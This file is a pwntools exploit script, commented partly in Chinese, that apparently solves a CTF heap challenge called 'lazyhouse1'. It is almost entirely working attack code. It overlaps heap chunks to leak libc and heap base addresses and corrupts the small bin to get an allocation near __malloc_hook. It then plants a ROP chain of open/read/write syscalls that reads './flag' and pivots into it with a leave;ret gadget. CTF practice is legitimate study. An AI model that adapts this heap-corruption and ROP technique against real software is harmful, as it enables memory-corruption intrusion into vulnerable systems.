#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './lazyhouse1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')

def debug():
    gdb.attach(p)
    pause()

bps = [0x1C62,0x1D9E]
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Your choice: ')

def create(idx, size, content):
    eat()
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('House:')
    p.send(content)

def show(index):
    eat()
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))

def delete(index):
    eat()
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))

def edit(index, content):
    eat()
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('House:')
    p.send(content)

def backdoor(content):
    eat()
    p.sendline('5')
    p.recvuntil('House:')
    p.send(content)

# 遇到 bug
# int_overflow = (2 ** 64) // 218 + 1
# create(0,int_overflow,'123')

# leak_libc & heapbase
for i in range(7):
    create(0,0x88,'1')
    delete(0)

for i in range(7):
    create(0,0x2c8,'1')#! 0x90*5 = 0x2d0
    delete(0)

create(0,0x88,'1')# edit
create(1,0x88,'1')# fake_size 0x2D1
create(2,0x88,'1')# overlap
create(3,0x88,'1')# 防止 consolidate
create(4,0x88,'1')# overlap
create(5,0x88,'1')# 防止 prev_size 验证 以及 防止进 top

edit(0,0x80*b'a'+p64(0)+p64(0x2D1))

delete(1)


create(1,0x2c8,(b'\x00' * 0x80 + p64(0) + p64(0x91)) * 4)# fake_size 0x241

delete(2)

delete(4)

show(1)

p.recv(0x90)
libc.address = u64(p.recv(8).ljust(8, b"\x00"))-0x1e4ca0
log.success("libc.address: "+hex(libc.address))

heap_base = u64(p.recv(8).ljust(8, b"\x00"))-0x1c30
log.success("heap_base: "+hex(heap_base))

# 方便下面使用下标
delete(0)

delete(3)#! 2 3 4 三个 0x90 合并 为 0x1a0

for i in range(7):
    create(0,0x100,'1')
    delete(0)

for i in range(5):
    create(0,0x210,'1')
    delete(0)
    

create(0,0x100,'1')
create(2,0x100,'1')

create(3,0x100,'1')

create(4,0x100,'1')
create(6,0x100,'1')

create(7,0x100,'1')

delete(0)
delete(2)

delete(4)# 伪造 bk
delete(6)

create(0,0x400,'1')# 放入small_bin

fd = heap_base+0x2e50
log.success("fd: "+hex(fd))
malloc_hook = libc.symbols["__malloc_hook"]
log.success("malloc_hook: "+hex(malloc_hook))
free_hook = libc.symbols["__free_hook"]
log.success("free_hook: "+hex(free_hook))
alloc_addr = malloc_hook - 0x200 - 0x10
log.success("alloc_addr: "+hex(alloc_addr))

edit(3,0x100*b'a'+p64(0)+p64(0x221)+p64(fd)+p64(alloc_addr))
#! *(p + 0x8) = 0x7ffff7fc4a83      *(p + 0x8)+0x10 = 0x7ffff7fc4a93
open_addr = libc.symbols['open'] #直接 call 的话 syscall 了 openat，就 kill 了
read_addr = libc.symbols['read']
write_addr = libc.symbols['write']
syscall_ret = 0xcf6c5 + libc.address

rdi_ret = 0x26542 + libc.address
rsi_ret = 0x26f9e + libc.address
rdx_ret = 0x12bda6 + libc.address
rax_ret = 0x47cf8 + libc.address
flag_addr = heap_base + 0x2f38
rop_addr = heap_base + 0x2e60
# add_rsp48h_addr = libc.address + 0x8cfd6
leave_ret = libc.address + 0x58373
rop = flat(
rdi_ret,flag_addr,rsi_ret,0,rdx_ret,0,rax_ret,2,syscall_ret,
rdi_ret,3,rsi_ret,flag_addr,rdx_ret,0x50,rax_ret,0,syscall_ret,
rdi_ret,1,rsi_ret,flag_addr,rdx_ret,0x50,rax_ret,1,syscall_ret,
'./flag\x00')

create(2,0x210,rop)# 返回给用户 chunkA，触发

backdoor(b'a'*0x200+p64(leave_ret))


eat()
p.sendline('1')
p.recvuntil('Index:')
p.sendline(str(4))
p.recvuntil('Size:')
p.sendline(str(rop_addr-0x8))

p.interactive()
